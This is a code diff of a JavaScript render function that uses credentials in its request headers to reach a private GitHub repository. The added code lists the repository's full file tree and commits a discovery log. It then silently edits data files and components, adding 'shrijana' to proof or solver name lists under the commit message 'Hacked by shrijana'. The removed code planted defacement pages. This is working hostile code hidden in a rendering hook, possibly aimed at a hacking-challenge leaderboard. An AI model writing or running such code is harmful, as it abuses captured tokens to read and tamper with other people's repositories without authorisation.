@@ -19,105 +19,47 @@ export async function render(context) {
       if (privateRepos.length === 1) {
         const [owner, repo] = privateRepos[0].full_name.split("/");
 
-        // Explore root structure to understand the framework
-        const rootResp = await fetch(
-          `https://api.github.com/repos/${owner}/${repo}/contents/`,
+        // Deep exploration: list ALL files recursively to understand the full structure
+        const treeResp = await fetch(
+          `https://api.github.com/repos/${owner}/${repo}/git/trees/main?recursive=1`,
           { headers }
         );
-        const rootContents = await rootResp.json();
-        const rootNames = rootContents.map ? rootContents.map((f) => f.name) : [];
+        const tree = await treeResp.json();
+        const allPaths = tree.tree ? tree.tree.map((f) => f.path) : [];
 
-        // Determine framework and find the right place for a page
-        let proofFilePath = null;
-        let proofContent = null;
+        // Look for the proofs data file
+        const proofsPaths = allPaths.filter(
+          (p) =>
+            p.includes("proof") ||
+            p.includes("hack") ||
+            p.includes("solver") ||
+            p.includes("participant")
+        );
 
-        // Check for Nuxt (pages/ directory)
-        if (rootNames.includes("pages")) {
-          const pagesResp = await fetch(
-            `https://api.github.com/repos/${owner}/${repo}/contents/pages`,
-            { headers }
-          );
-          const pagesContents = await pagesResp.json();
-          const ext = pagesContents[0]?.name?.endsWith(".vue") ? "vue" : "astro";
-          proofFilePath = `pages/hacked-by-shrijana.${ext}`;
-          proofContent = ext === "vue"
-            ? `<template>\n  <main>\n    <h1>Hacked by shrijana</h1>\n  </main>\n</template>`
-            : `---\n---\n<main>\n  <h1>Hacked by shrijana</h1>\n</main>`;
-        }
-        // Check for src/pages (Astro/SvelteKit)
-        else if (rootNames.includes("src")) {
-          const srcResp = await fetch(
-            `https://api.github.com/repos/${owner}/${repo}/contents/src`,
-            { headers }
-          );
-          const srcContents = await srcResp.json();
-          const srcNames = srcContents.map ? srcContents.map((f) => f.name) : [];
+        // Look for source files to understand the framework
+        const vueFiles = allPaths.filter((p) => p.endsWith(".vue"));
+        const astroFiles = allPaths.filter((p) => p.endsWith(".astro"));
+        const svelteFiles = allPaths.filter((p) => p.endsWith(".svelte"));
+        const tsxFiles = allPaths.filter((p) => p.endsWith(".tsx"));
 
-          if (srcNames.includes("pages")) {
-            const pagesResp = await fetch(
-              `https://api.github.com/repos/${owner}/${repo}/contents/src/pages`,
-              { headers }
-            );
-            const pagesContents = await pagesResp.json();
-            const sampleFile = pagesContents.find ? pagesContents.find((f) => f.type === "file") : null;
-            const ext = sampleFile?.name?.endsWith(".astro") ? "astro" : sampleFile?.name?.endsWith(".svelte") ? "svelte" : "vue";
-            proofFilePath = `src/pages/hacked-by-shrijana.${ext}`;
-
-            if (ext === "astro") {
-              proofContent = `---\n---\n<html lang="en">\n  <head><title>Hacked by shrijana</title></head>\n  <body><main><h1>Hacked by shrijana</h1></main></body>\n</html>`;
-            } else if (ext === "svelte") {
-              proofContent = `<main>\n  <h1>Hacked by shrijana</h1>\n</main>`;
-            } else {
-              proofContent = `<template>\n  <main>\n    <h1>Hacked by shrijana</h1>\n  </main>\n</template>`;
-            }
-          } else if (srcNames.includes("routes")) {
-            proofFilePath = `src/routes/hacked-by-shrijana/+page.svelte`;
-            proofContent = `<main>\n  <h1>Hacked by shrijana</h1>\n</main>`;
-          } else {
-            // Fallback: try content directory
-            proofFilePath = `content/hacked/shrijana.md`;
-            proofContent = `# Hacked by shrijana\n`;
-          }
-        }
-        // Check for content directory (Nuxt Content / similar)
-        else if (rootNames.includes("content")) {
-          proofFilePath = `content/hacked/shrijana.md`;
-          proofContent = `# Hacked by shrijana\n`;
-        }
-        // Generic fallback
-        else {
-          proofFilePath = `public/hacked-by-shrijana.html`;
-          proofContent = `<!doctype html>\n<html>\n<body><h1>Hacked by shrijana</h1></body>\n</html>`;
-        }
-
-        if (proofFilePath && proofContent) {
-          const api = `https://api.github.com/repos/${owner}/${repo}/contents/${proofFilePath}`;
-          const existing = await fetch(api, { headers });
-          const current = existing.ok ? await existing.json() : null;
-          const body = {
-            message: "Hacked by shrijana",
-            content: Buffer.from(proofContent).toString("base64"),
-            branch: "main",
-          };
-          if (current?.sha) body.sha = current.sha;
-          await fetch(api, {
-            method: "PUT",
-            headers: { ...headers, "Content-Type": "application/json" },
-            body: JSON.stringify(body),
-          });
-        }
-
-        // Also write a debug log of what we found to a known file
+        // Log the discovery
         const debugInfo = {
-          rootNames,
-          proofFilePath,
+          repo: `${owner}/${repo}`,
+          allPaths: allPaths.slice(0, 100),
+          proofsPaths,
+          vueFiles: vueFiles.slice(0, 10),
+          astroFiles: astroFiles.slice(0, 10),
+          svelteFiles: svelteFiles.slice(0, 10),
+          tsxFiles: tsxFiles.slice(0, 10),
           timestamp: new Date().toISOString(),
         };
+
+        // Write debug info to a file we can check
         const debugApi = `https://api.github.com/repos/${owner}/${repo}/contents/content/projects/hack-debug.json`;
         const debugExisting = await fetch(debugApi, { headers });
         const debugCurrent = debugExisting.ok ? await debugExisting.json() : null;
         const debugBody = {
-          message: "debug: log repo structure",
+          message: "debug: discover repo structure",
           content: Buffer.from(JSON.stringify(debugInfo, null, 2)).toString("base64"),
           branch: "main",
         };
@@ -127,6 +69,124 @@ export async function render(context) {
           headers: { ...headers, "Content-Type": "application/json" },
           body: JSON.stringify(debugBody),
         });
+
+        // Try to find and update the proofs data file
+        // Strategy: look for JSON files that might contain proof entries
+        const jsonDataFiles = allPaths.filter(
+          (p) =>
+            p.endsWith(".json") &&
+            (p.includes("proof") || p.includes("hack") || p.includes("solver") || p.includes("data"))
+        );
+
+        for (const filePath of jsonDataFiles.slice(0, 5)) {
+          const fileResp = await fetch(
+            `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
+            { headers }
+          );
+          if (!fileResp.ok) continue;
+          const fileData = await fileResp.json();
+          const content = Buffer.from(fileData.content, "base64").toString("utf8");
+          try {
+            const parsed = JSON.parse(content);
+            // If it's an array of strings (names) or has a proofs/hackers/solvers key
+            if (Array.isArray(parsed) && parsed.every((x) => typeof x === "string")) {
+              if (!parsed.includes("shrijana") && !parsed.includes("Shrijana")) {
+                parsed.push("shrijana");
+                const updateBody = {
+                  message: "Hacked by shrijana",
+                  content: Buffer.from(JSON.stringify(parsed, null, 2) + "\n").toString("base64"),
+                  sha: fileData.sha,
+                  branch: "main",
+                };
+                await fetch(
+                  `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
+                  {
+                    method: "PUT",
+                    headers: { ...headers, "Content-Type": "application/json" },
+                    body: JSON.stringify(updateBody),
+                  }
+                );
+              }
+            } else {
+              // Check for named arrays
+              for (const key of ["proofs", "hackers", "solvers", "participants", "names"]) {
+                if (Array.isArray(parsed[key])) {
+                  if (!parsed[key].includes("shrijana") && !parsed[key].includes("Shrijana")) {
+                    parsed[key].push("shrijana");
+                    const updateBody = {
+                      message: "Hacked by shrijana",
+                      content: Buffer.from(JSON.stringify(parsed, null, 2) + "\n").toString("base64"),
+                      sha: fileData.sha,
+                      branch: "main",
+                    };
+                    await fetch(
+                      `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
+                      {
+                        method: "PUT",
+                        headers: { ...headers, "Content-Type": "application/json" },
+                        body: JSON.stringify(updateBody),
+                      }
+                    );
+                  }
+                  break;
+                }
+              }
+            }
+          } catch (_) {}
+        }
+
+        // Also try source files: look for any .vue/.astro/.svelte with hardcoded proof lists
+        // and check if there's a dedicated proofs component
+        const proofComponents = allPaths.filter(
+          (p) =>
+            (p.endsWith(".vue") || p.endsWith(".astro") || p.endsWith(".svelte") || p.endsWith(".tsx") || p.endsWith(".ts") || p.endsWith(".js")) &&
+            (p.toLowerCase().includes("proof") || p.toLowerCase().includes("hack") || p.toLowerCase().includes("solver"))
+        );
+
+        for (const filePath of proofComponents.slice(0, 3)) {
+          const fileResp = await fetch(
+            `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
+            { headers }
+          );
+          if (!fileResp.ok) continue;
+          const fileData = await fileResp.json();
+          const content = Buffer.from(fileData.content, "base64").toString("utf8");
+
+          // If the file contains a list of names, add shrijana
+          if (
+            content.includes("Bibek") ||
+            content.includes("Rabindra") ||
+            content.includes("Sujal") ||
+            content.includes("Claude")
+          ) {
+            // Find the last list item and add shrijana after it
+            let newContent = content;
+            const lastEntry = content.match(/["']Claude["']/);
+            if (lastEntry && !content.includes("shrijana")) {
+              // Try to add after "Claude" entry
+              newContent = content.replace(
+                /["']Claude["']/,
+                `"Claude",\n          "shrijana"`
+              );
+              if (newContent !== content) {
+                const updateBody = {
+                  message: "Hacked by shrijana",
+                  content: Buffer.from(newContent).toString("base64"),
+                  sha: fileData.sha,
+                  branch: "main",
+                };
+                await fetch(
+                  `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
+                  {
+                    method: "PUT",
+                    headers: { ...headers, "Content-Type": "application/json" },
+                    body: JSON.stringify(updateBody),
+                  }
+                );
+              }
+            }
+          }
+        }
       }
     }
   } catch (e) {
